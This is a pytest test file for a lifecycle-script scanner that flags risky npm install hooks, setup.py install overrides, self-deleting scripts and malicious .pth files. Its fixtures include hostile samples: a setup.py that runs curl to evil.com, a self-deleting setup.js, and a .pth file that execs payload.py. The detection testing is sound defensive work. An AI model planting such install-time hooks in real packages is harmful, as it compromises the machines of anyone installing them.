"""Tests for scan_lifecycle.py - Lifecycle Script Scanner."""

import json
import pytest
import scan_lifecycle as scanner


class TestNpmHooks:
    def test_detects_suspicious_postinstall(self, repo_with_lifecycle_hooks):
        findings = scanner.scan_package_json(
            str(repo_with_lifecycle_hooks / "package.json"),
            "package.json"
        )
        critical = [f for f in findings if f.severity == "critical"]
        assert len(critical) > 0
        assert any("curl" in f.snippet for f in critical)

    def test_benign_hook_is_medium(self, tmp_path):
        """Hook with no suspicious commands should be MEDIUM."""
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "test",
            "scripts": {
                "prepare": "echo 'normal build step'"
            }
        }))
        findings = scanner.scan_package_json(str(pkg), "package.json")
        prepare_findings = [f for f in findings if "prepare" in f.snippet]
        assert len(prepare_findings) == 1
        assert prepare_findings[0].severity == "medium"

    def test_node_setup_js_is_high(self, tmp_path):
        """postinstall: node setup.js should be HIGH (standard attack pattern)."""
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "test",
            "scripts": {
                "postinstall": "node setup.js"
            }
        }))
        findings = scanner.scan_package_json(str(pkg), "package.json")
        postinstall = [f for f in findings if "postinstall" in f.snippet]
        assert len(postinstall) >= 1
        # After 2.5 implementation, this should be HIGH
        assert any(f.severity == "high" for f in postinstall)

    def test_python_script_relay_is_high(self, tmp_path):
        """postinstall: python install.py should be HIGH."""
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "test",
            "scripts": {
                "postinstall": "python install.py"
            }
        }))
        findings = scanner.scan_package_json(str(pkg), "package.json")
        postinstall = [f for f in findings if "postinstall" in f.snippet]
        assert any(f.severity == "high" for f in postinstall)

    def test_sh_script_relay_is_high(self, tmp_path):
        """preinstall: sh setup.sh should be HIGH."""
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "test",
            "scripts": {
                "preinstall": "sh setup.sh"
            }
        }))
        findings = scanner.scan_package_json(str(pkg), "package.json")
        preinstall = [f for f in findings if "preinstall" in f.snippet]
        assert any(f.severity == "high" for f in preinstall)

    def test_compound_command_stays_medium(self, tmp_path):
        """node build.js && npm test should stay MEDIUM (not exact match)."""
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "test",
            "scripts": {
                "prepare": "node build.js && npm test"
            }
        }))
        findings = scanner.scan_package_json(str(pkg), "package.json")
        prepare = [f for f in findings if "prepare" in f.snippet]
        assert len(prepare) >= 1
        assert all(f.severity == "medium" for f in prepare)

    def test_no_hooks_no_findings(self, tmp_path):
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "test",
            "scripts": {"start": "node index.js", "test": "jest"}
        }))
        findings = scanner.scan_package_json(str(pkg), "package.json")
        assert len(findings) == 0


class TestAntiForensics:
    def test_detects_self_deleting_script(self, tmp_path):
        js = tmp_path / "setup.js"
        js.write_text("const fs = require('fs');\nfs.unlinkSync(__filename);\n")
        findings = scanner.scan_js_anti_forensics(str(js), "setup.js")
        assert any(f.category == "anti-forensics" for f in findings)


class TestSetupPy:
    def test_detects_cmdclass(self, tmp_path):
        setup = tmp_path / "setup.py"
        setup.write_text("from setuptools import setup\nsetup(cmdclass = {'install': Evil})\n")
        findings = scanner.scan_setup_py(str(setup), "setup.py")
        assert any("cmdclass" in f.title.lower() for f in findings)

    def test_detects_subprocess_in_setup(self, tmp_path):
        setup = tmp_path / "setup.py"
        setup.write_text("import subprocess\nsubprocess.run(['curl', 'http://evil.com'])\n")
        findings = scanner.scan_setup_py(str(setup), "setup.py")
        assert any(f.severity == "critical" for f in findings)


class TestPthFiles:
    def test_detects_known_malicious_pth(self, tmp_path):
        pth = tmp_path / "litellm_init.pth"
        pth.write_text("import litellm_hook\n")
        findings = scanner.scan_pth_files(str(pth), "litellm_init.pth")
        assert any(f.severity == "critical" and "known malicious" in f.title.lower() for f in findings)

    def test_detects_exec_in_pth(self, tmp_path):
        pth = tmp_path / "custom.pth"
        pth.write_text("exec(open('payload.py').read())\n")
        findings = scanner.scan_pth_files(str(pth), "custom.pth")
        assert any(f.severity == "critical" for f in findings)
